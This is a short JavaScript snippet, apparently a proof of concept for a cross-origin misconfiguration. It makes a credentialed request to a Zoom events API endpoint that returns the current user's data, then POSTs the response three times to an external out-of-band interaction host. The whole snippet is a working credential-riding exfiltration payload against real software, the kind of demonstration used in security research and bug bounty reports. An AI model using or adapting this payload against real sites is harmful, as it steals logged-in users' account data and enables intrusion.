var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('GET','https://events.zoom.us/api/v1/e/getCurrentUser',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    for(let i = 0; i < 3; i++){
        fetch('https://ck2ps4m2vtc0000jtfw0gjtmc1cyyyyyb.oast.fun/pocs', {
            method: 'POST',
            body: this.responseText
        });
    }
};
